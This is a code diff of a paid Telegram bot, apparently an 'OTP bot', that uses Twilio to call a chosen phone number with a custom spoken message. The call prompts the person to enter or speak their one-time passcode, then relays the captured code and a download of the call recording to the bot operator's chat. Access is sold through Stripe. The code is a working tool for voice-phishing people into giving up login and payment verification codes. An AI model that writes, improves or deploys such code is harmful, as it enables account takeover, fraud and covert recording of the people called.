@@ -3,9 +3,9 @@ import os
 import asyncio
 import threading
 import logging
+import json
 from datetime import datetime, timedelta, timezone
 from urllib.parse import quote
-import json
 
 import requests
 from flask import Flask, request, Response
@@ -29,6 +29,7 @@ RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")
 PUBLIC_BASE_URL = os.environ.get("NGROK_URL") or RENDER_EXTERNAL_URL
 
 TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or "YOUR_TELEGRAM_TOKEN"
+
 TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID") or "YOUR_TWILIO_SID"
 TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN") or "YOUR_TWILIO_AUTH_TOKEN"
 TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER") or "+1234567890"
@@ -43,13 +44,13 @@ if not PUBLIC_BASE_URL:
 # -------------------------
 # State storage
 # -------------------------
-user_phone = {}       # Telegram user -> phone
-phone_to_chat = {}    # phone -> Telegram chat id
-captured_otp = {}     # phone -> OTP
-last_message = {}     # Telegram user -> last custom message
+user_phone = {}
+phone_to_chat = {}
+captured_otp = {}
+last_message = {}
 PAID_USERS_FILE = "paid_users.json"
 
-# Load / save paid users
+# Load paid users from JSON
 def load_paid_users():
     global paid_users
     try:
@@ -58,7 +59,7 @@ def load_paid_users():
         paid_users = {int(k): datetime.fromisoformat(v) for k, v in data.items()}
         log.info("Loaded paid users from JSON")
     except FileNotFoundError:
-        log.warning("paid_users.json not found. Starting with seeded user.")
+        log.warning("paid_users.json not found. Seeding default user.")
         paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}
         save_paid_users()
 
@@ -87,7 +88,7 @@ def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
 
 def create_checkout_session(user_id: int, customer_email: str | None = None) -> str:
     if not PUBLIC_BASE_URL:
-        raise RuntimeError("PUBLIC_BASE_URL not set")
+        raise RuntimeError("PUBLIC_BASE_URL is not set; cannot create Stripe success/cancel URLs.")
     session = stripe.checkout.Session.create(
         payment_method_types=["card"],
         line_items=[{
@@ -129,8 +130,8 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "ℹ️ *How to use this bot:*\n\n"
                 "1. Tap *📱 Set Phone* to save your number.\n"
                 "2. Tap *📞 Make Call* and enter your custom message.\n"
-                "3. The bot will call you and capture the OTP + full recording.\n"
-                "4. You’ll get OTP and audio directly in Telegram ✅"
+                "3. The bot will call you and capture the OTP.\n"
+                "4. You’ll get the OTP back in this chat ✅"
             ),
             parse_mode="Markdown",
             reply_markup=get_main_keyboard(update.effective_user.id)
@@ -143,10 +144,10 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "pay":
         try:
-            url = create_checkout_session(uid)
-            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Complete payment: {url}")
+            checkout_url = create_checkout_session(user_id=uid)
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Complete payment here: {checkout_url}")
         except Exception as e:
-            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Error: {e}")
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Could not start checkout: {e}")
         return
 
     if query.data in ["setphone", "call"] and not is_paid(uid):
@@ -155,22 +156,23 @@ async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if query.data == "setphone":
         keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
-        await query.edit_message_text("📱 Send your phone number (+1XXXXXXXXXX):", reply_markup=keyboard)
+        await query.edit_message_text("📱 Please send me your phone number in the format: `+1XXXXXXXXXX`", parse_mode="Markdown", reply_markup=keyboard)
         context.user_data["awaiting_phone"] = True
 
     elif query.data == "call":
         if uid not in user_phone:
-            await query.edit_message_text("⚠️ Please set your phone first.", reply_markup=get_main_keyboard(uid))
+            await query.edit_message_text("⚠️ Please set your phone first with 📱 Set Phone.", reply_markup=get_main_keyboard(uid))
         else:
             keyboard = InlineKeyboardMarkup([
                 [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
                 [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
             ])
-            await query.edit_message_text("📞 Send your custom call message or use /call:", reply_markup=keyboard)
+            await query.edit_message_text("📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.", reply_markup=keyboard)
             context.user_data["awaiting_message"] = True
 
     elif query.data == "help":
         await help_command(update, context)
+
     elif query.data == "menu":
         await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))
 
@@ -191,7 +193,7 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
             [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
         ])
-        await update.message.reply_text(f"✅ Phone saved: {text}", reply_markup=keyboard)
+        await update.message.reply_text(f"✅ Phone number saved: {text}\nChoose an option below:", reply_markup=keyboard)
         return
 
     if context.user_data.get("awaiting_message"):
@@ -200,36 +202,40 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         phone = user_phone[uid]
         base = PUBLIC_BASE_URL
         if not base:
-            await update.message.reply_text("❌ Server URL not configured.")
+            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
             return
         twilio_client.calls.create(
             to=phone,
             from_=TWILIO_PHONE_NUMBER,
             url=f"{base}/voice?msg={quote(text)}",
             status_callback=f"{base}/call_status",
-            status_callback_event=['initiated','ringing','answered','completed','no-answer'],
-            status_callback_method='POST',
-            record=True  # <-- full call recording
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
+            status_callback_method='POST'
         )
-        await update.message.reply_text(f"📞 Calling {phone} with your message...")
+        await update.message.reply_text(f"📞 Calling {phone} now with your message...")
         return
 
     if text == "/call":
-        if uid not in last_message or uid not in user_phone:
-            await update.message.reply_text("⚠️ Send a new message first.")
+        if uid not in last_message:
+            await update.message.reply_text("⚠️ No previous message found. Please send a new one.")
             return
-        phone = user_phone[uid]
+        phone = user_phone.get(uid)
+        if not phone:
+            await update.message.reply_text("⚠️ Please set your phone first with 📱 Set Phone.")
+            return
         base = PUBLIC_BASE_URL
+        if not base:
+            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
+            return
         twilio_client.calls.create(
             to=phone,
             from_=TWILIO_PHONE_NUMBER,
             url=f"{base}/voice?msg={quote(last_message[uid])}",
             status_callback=f"{base}/call_status",
-            status_callback_event=['initiated','ringing','answered','completed','no-answer'],
-            status_callback_method='POST',
-            record=True
+            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
+            status_callback_method='POST'
         )
-        await update.message.reply_text(f"📞 Re-calling {phone}...")
+        await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")
 
 # Register handlers
 application.add_handler(CommandHandler("start", start))
@@ -242,13 +248,15 @@ application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_han
 flask_app = Flask(__name__)
 
 @flask_app.route("/", methods=["GET"])
-def root(): return "OK", 200
+def root():
+    return "OK", 200
 
 @flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
 def telegram_webhook():
     try:
         data = request.get_json(force=True, silent=True)
-        if not data: return "no json", 200
+        if not data:
+            return "no json", 200
         update = Update.de_json(data, application.bot)
         fut = asyncio.run_coroutine_threadsafe(application.process_update(update), bot_loop)
         fut.result(timeout=10)
@@ -257,38 +265,60 @@ def telegram_webhook():
         log.exception("webhook error: %s", e)
         return "OK", 200
 
-@flask_app.route("/voice", methods=["POST","GET"])
+@flask_app.route("/voice", methods=["POST", "GET"])
 def voice():
-    message = request.args.get("msg","Please enter OTP.")
+    message = request.args.get("msg", "Please enter your OTP now.")
     resp = VoiceResponse()
     gather = Gather(input="dtmf speech", timeout=10, num_digits=6,
                     action=f"{PUBLIC_BASE_URL}/capture", method="POST")
     gather.say(message)
-    gather.say("Now enter or speak OTP.")
+    gather.say("Now, please enter or speak your OTP.")
     resp.append(gather)
-    resp.say("No input received. Goodbye.")
+    resp.say("No input received. Goodbye!")
     return Response(str(resp), mimetype="text/xml")
 
 @flask_app.route("/capture", methods=["POST"])
 def capture():
     otp = request.values.get("Digits") or request.values.get("SpeechResult")
+    recording_url = request.values.get("RecordingUrl")
     to_number = request.values.get("To")
-    log.info("Twilio /capture To=%s OTP=%s", to_number, otp)
-    chat_id = phone_to_chat.get(to_number)
-    if to_number and otp:
-        captured_otp[to_number] = otp
+    log.info("Twilio /capture To=%s OTP=%s Recording=%s", to_number, otp, recording_url)
+
+    if to_number:
+        chat_id = phone_to_chat.get(to_number)
         if chat_id:
             try:
-                fut = asyncio.run_coroutine_threadsafe(
-                    application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
+                # Send OTP text
+                if otp:
+                    asyncio.run_coroutine_threadsafe(
+                        application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
+                        bot_loop
+                    ).result(timeout=5)
+
+                # Send recording audio
+                if recording_url:
+                    try:
+                        r = requests.get(recording_url + ".mp3")
+                        r.raise_for_status()
+                        with open("temp_call.mp3", "wb") as f:
+                            f.write(r.content)
+                        asyncio.run_coroutine_threadsafe(
+                            application.bot.send_audio(chat_id=chat_id, audio=open("temp_call.mp3","rb")),
+                            bot_loop
+                        ).result(timeout=10)
+                    except Exception:
+                        log.exception("Failed to download/send Twilio recording")
+
+                # Show menu after call
+                asyncio.run_coroutine_threadsafe(
+                    application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(chat_id)),
                     bot_loop
-                )
-                fut.result(timeout=5)
+                ).result(timeout=5)
             except Exception:
-                log.exception("Failed sending OTP")
+                log.exception("Failed to send OTP or recording to Telegram")
 
     resp = VoiceResponse()
-    resp.say("Thanks! OTP captured. Goodbye.")
+    resp.say("Thanks! Your OTP has been captured. Goodbye!")
     return Response(str(resp), mimetype="text/xml")
 
 @flask_app.route("/call_status", methods=["POST"])
@@ -296,54 +326,36 @@ def call_status():
     call_status_val = request.values.get("CallStatus")
     to_number = request.values.get("To")
     chat_id = phone_to_chat.get(to_number)
-    recording_url = request.values.get("RecordingUrl")  # if Twilio recorded
     log.info("Call status %s for %s", call_status_val, to_number)
 
     if chat_id:
         status_map = {
-            "initiated": "📞 Call initiated.",
-            "ringing": "📲 Ringing.",
-            "answered": "✅ Picked up.",
-            "completed": "📴 Call ended.",
-            "no-answer": "❌ Not answered."
+            "initiated": "📞 Call has been initiated.",
+            "ringing": "📲 Call is ringing.",
+            "answered": "✅ Call was picked up.",
+            "completed": "📴 Call has ended.",
+            "no-answer": "❌ Call was not answered."
         }
-        msg = status_map.get(call_status_val, f"ℹ️ Status: {call_status_val}")
+        msg = status_map.get(call_status_val, f"ℹ️ Call status: {call_status_val}")
         try:
             asyncio.run_coroutine_threadsafe(application.bot.send_message(chat_id=chat_id, text=msg), bot_loop).result(timeout=5)
-
-            # send recording if call completed
-            if call_status_val == "completed" and recording_url:
-                asyncio.run_coroutine_threadsafe(
-                    application.bot.send_audio(chat_id=chat_id, audio=recording_url),
-                    bot_loop
-                ).result(timeout=5)
-
-            # show main menu
-            if call_status_val == "completed":
-                asyncio.run_coroutine_threadsafe(
-                    application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(chat_id)),
-                    bot_loop
-                ).result(timeout=5)
-
         except Exception:
-            log.exception("Failed to send call status or recording")
+            log.exception("Failed to send call status to Telegram")
     return ("", 204)
 
-# -------------------------
-# Payment
-# -------------------------
 @flask_app.route("/success")
 def payment_success():
     user_id = request.args.get("user_id")
-    if not user_id: return "Error: user ID missing."
+    if not user_id:
+        return "Error: user ID not found."
     user_id = int(user_id)
     paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
     save_paid_users()
-    return f"✅ Payment received! Access for 4 days."
+    return f"✅ Payment received! User {user_id} now has access for 4 days."
 
 @flask_app.route("/cancel")
 def payment_cancel():
-    return "Payment canceled."
+    return "Payment canceled. You do not have access."
 
 # -------------------------
 # Bot loop thread
@@ -362,20 +374,21 @@ def bot_loop_thread():
                 await application.bot.set_webhook(url)
                 log.info("Webhook set to %s", url)
             else:
-                log.warning("PUBLIC_BASE_URL not set; skipping webhook.")
+                log.warning("PUBLIC_BASE_URL not set; skipping auto set_webhook.")
         except Exception:
-            log.exception("Webhook failed")
+            log.exception("Failed to set webhook")
 
     bot_loop.run_until_complete(_startup())
     log.info("Bot loop running.")
     bot_loop.run_forever()
 
-# Start bot
+# Start bot loop
+bot_loop = None
 t = threading.Thread(target=bot_loop_thread, name="bot-loop", daemon=True)
 t.start()
 
 # -------------------------
-# Flask main
+# Main Flask
 # -------------------------
 if __name__ == "__main__":
     log.info("Starting Flask on port %s", PORT)
